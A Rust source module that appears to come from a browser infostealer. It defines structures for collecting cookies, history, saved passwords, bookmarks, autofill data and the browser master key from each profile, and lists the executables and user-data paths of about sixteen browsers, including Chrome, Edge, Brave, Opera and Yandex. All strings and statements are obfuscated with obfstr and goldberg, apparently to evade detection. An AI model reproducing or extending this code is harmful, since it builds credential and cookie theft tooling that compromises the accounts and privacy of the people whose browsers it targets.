use goldberg::goldberg_stmts;
use rayon::prelude::{IntoParallelRefIterator, ParallelIterator};
use std::collections::HashMap;
use lazy_static::lazy_static;
use obfstr::obfstr as obf;

use crate::global::utils::{ROAMING, APPDATA};

use serde::Serialize;

#[derive(Default, Debug, Clone, Serialize)]
pub struct Profiles {
    pub id: usize,
    pub profile_name: String,
    pub cookies: Vec<String>,
    pub history: Vec<String>,
    pub password: Vec<String>,
    pub bookmarks: Vec<String>, 
    pub autofill: Vec<String>,
}

#[derive(Default, Debug, Clone, Serialize)]
pub struct Browser {
    pub name: String,
    pub path: String,
    pub masterkey: Vec<u8>,
    pub profiles: Vec<Profiles>,
}

pub fn is_opera(browser_name : &String, path : &String, profile : String, suffix : String) -> String {
    if browser_name == "opera" || browser_name == "opera-gx" {
        return format!("{}{}", path, suffix);   
    }
    format!("{}\\{}{}", path, profile, suffix)
}

goldberg_stmts! {
    lazy_static! {

        pub static ref BROWSER_EXE: Vec<String> = vec![
            obf!("chrome.exe"), obf!("firefox.exe"), obf!("brave.exe"), obf!("opera.exe"),
            obf!("kometa.exe"), obf!("orbitum.exe"), obf!("centbrowser.exe"), obf!("7star.exe"),
            obf!("sputnik.exe"), obf!("vivaldi.exe"), obf!("epicprivacybrowser.exe"), obf!("msedge.exe"),
            obf!("uran.exe"), obf!("yandex.exe"), obf!("iridium.exe"),
            obf!("GoogleCrashHandler.exe"), obf!("GoogleCrashHandler64.exe"),
        ].par_iter().map(|s| String::from(*s)).collect();

        pub static ref PROFILES: Vec<String> = vec![
            obf!("Default"), obf!("Profile 1"), obf!("Profile 2"), obf!("Profile 3"),
            obf!("Profile 4"), obf!("Profile 5"),
        ].par_iter().map(|s| String::from(*s)).collect();


        pub static ref BROWSERS: HashMap<String, String> = {
            let roaming = ROAMING.as_str();
            let appdata = APPDATA.as_str();
            return HashMap::from([
                (String::from(obf!("kometa")), format!("{}{}", appdata, obf!("\\Kometa\\User Data"))),
                (String::from(obf!("orbitum")), format!("{}{}", appdata, obf!("\\Orbitum\\User Data"))),
                (String::from(obf!("cent-browser")), format!("{}{}", appdata, obf!("\\CentBrowser\\User Data"))),
                (String::from(obf!("7star")), format!("{}{}", appdata, obf!("\\7Star\\7Star\\User Data"))),
                (String::from(obf!("sputnik")), format!("{}{}", appdata, obf!("\\Sputnik\\Sputnik\\User Data"))),
                (String::from(obf!("vivaldi")), format!("{}{}", appdata, obf!("\\Vivaldi\\User Data"))),
                (String::from(obf!("google-chrome-sxs")), format!("{}{}", appdata, obf!("\\Google\\Chrome SxS\\User Data"))),
                (String::from(obf!("google-chrome")), format!("{}{}", appdata, obf!("\\Google\\Chrome\\User Data"))),
                (String::from(obf!("epic-privacy-browser")), format!("{}{}", appdata, obf!("\\Epic Privacy Browser\\User Data"))),
                (String::from(obf!("microsoft-edge")), format!("{}{}", appdata, obf!("\\Microsoft\\Edge\\User Data"))),
                (String::from(obf!("uran")), format!("{}{}", appdata, obf!("\\uCozMedia\\Uran\\User Data"))),
                (String::from(obf!("yandex")), format!("{}{}", appdata, obf!("\\Yandex\\YandexBrowser\\User Data"))),
                (String::from(obf!("brave")), format!("{}{}", appdata, obf!("\\BraveSoftware\\Brave-Browser\\User Data"))),
                (String::from(obf!("iridium")), format!("{}{}", appdata, obf!("\\Iridium\\User Data"))),
                (String::from(obf!("opera")), format!("{}{}", roaming, obf!("\\Opera Software\\Opera Stable"))),
                (String::from(obf!("opera-gx")), format!("{}{}", roaming, obf!("\\Opera Software\\Opera GX Stable"))),
            ]);
                
        };
    }
}